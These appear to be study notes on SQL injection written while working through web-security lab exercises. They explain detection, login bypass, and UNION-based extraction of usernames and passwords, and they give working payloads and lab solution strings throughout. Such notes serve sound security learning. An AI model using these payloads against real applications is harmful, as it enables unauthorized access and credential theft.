SQL Injection is a vulnerability that allows an attacker to interfere with the query 
that an application makes to the database.
A sql injection attack can result in the disclosure of sensitive data like passwords, 
credit card details and personal infromation.
 
How to know if an application is subjected to SQLi attack.?
- Submit the payload (') in the filed that takes the input and see the error messages 
the application returns.
- Submit boolean expressions like OR 1=1 (or) OR 1=2 to see the response.
- Time delays ( create time delays with sql queries and see how the application 
responds)
- OAST (out-of-band interactions)


SQL Injection in different parts of the query:

Monstly sql injection occurs in the WHERE clause of the SELECT queries.
Some other locations are
- UPDATE ( in where clause)
- INSERT (within the insert statements)
- SELECT ( with in the table or column name)
- SELECT( within ORDER BY clause)


SQL Injection Example:
Some SQL Injection attacks include;
- Retrieving the hidden data
- Subverting the application logic(interfering with the application logic)
- UNION Attacks( to retrieve the data from the multiple tables)
- Blind SQLi where the results of the query you control is not returned in the 
application response.

Retrieving the Hidden Data:
https://insecure-website.com/products?category=Gifts
The above url results in the returing of the products that listed in the category 
Gifts and by default the parameter is released = 1
The above mentioned url can be written as 
https://insecure-website.com/products?category=Gifts and release=1

We can display the hidden data by commenting the query after the category.

category='Gifts'--
The resultant query is 
https://insecure-website.com/products?category=Gifts-- and released=1
This displays all the products in the database which are categorised as Gifts which 
are released and not released.
We can also submit a boolean like 1=1 which displays all the items

Note:
Take care when injecting the condition OR 1=1 into a SQL query. Even if it appears to 
be harmless in the context you're injecting into, it's common for applications to use 
data from a single request in multiple different queries. If your condition reaches an 
UPDATE or DELETE statement, for example, it can result in an accidental loss of data.

Lab:
SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
	'+OR+1=1--
Subverting Application Logic:
When the user enters the username and password the query results in 
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'

If the application results the data based on the username then the attacker can use 
the WHERE clause to login as the user without the password.
For Example :
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''

This results the attacker to login as the administrator.
Lab:
 SQL injection vulnerability allowing login bypass
Modify the username parameter, giving it the value: administrator'--

Retrieving data from other database:
For the existing query like 
SELECT name, description FROM products WHERE category = 'Gifts'
We can append another query 
' UNION SELECT username, password FROM users--
Which returns the usernames and passwords from the users table along with the name and 
description from the products table.
This can be obtained by the UNION attacks.

SQL Injection UNION Attacks:
SELECT a, b FROM table1 UNION SELECT c, d FROM table2

For a UNION query to work, two key requirements must be met:

- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.

Determining the number of columns required:
Two methods:
1. ' ORDER BY 1--
   ' ORDER BY 2--
   ' ORDER BY 3--
2. ' UNION SELECT NULL--
   ' UNION SELECT NULL,NULL--
   ' UNION SELECT NULL,NULL,NULL--
The response displays the error if the number of columns specified does not match with 
the number of columns in the table.

Lab: SQL injection UNION attack, determining the number of columns returned by the 
query
'+UNION+SELECT+NULL,NULL--

Database Specific Syntax:
In oracle db every query should have the FROM keyword. The oracle provides a table 
called dual which can be used to perform the injection.
' UNION SELECT NULL FROM DUAL--

Finding columns with useful Data Types:
UNION Attack is helpful in this case.

' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
If the column data type is not compatible with string data, the injected query will 
cause a database error.

Lab: SQL injection UNION attack, finding a column containing text
'+UNION+SELECT+'abcdef',NULL,NULL--

Using a SQL injection UNION attack to retrieve interesting data:
If you can find which column holds the string data then you can return some 
interesting data.

The original query returns two columns, both of which can hold string data.
The injection point is a quoted string within the WHERE clause.
The database contains a table called users with the columns username and password.
In this example, you can retrieve the contents of the users table by submitting the 
input:

' UNION SELECT username, password FROM users--

Lab: SQL injection UNION attack, retrieving data from other tables
'+UNION+SELECT+'abc','def'--
'+UNION+SELECT+username,+password+FROM+users--

Retrieving multiple values within a single column:
If the query is returning only a single column, you can use the concatenation 
character to return the multiple results with in the column. You can also add the 
seperator.
' UNION SELECT username || '~' || password FROM users--

Lab: SQL injection UNION attack, retrieving multiple values in a single column
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--




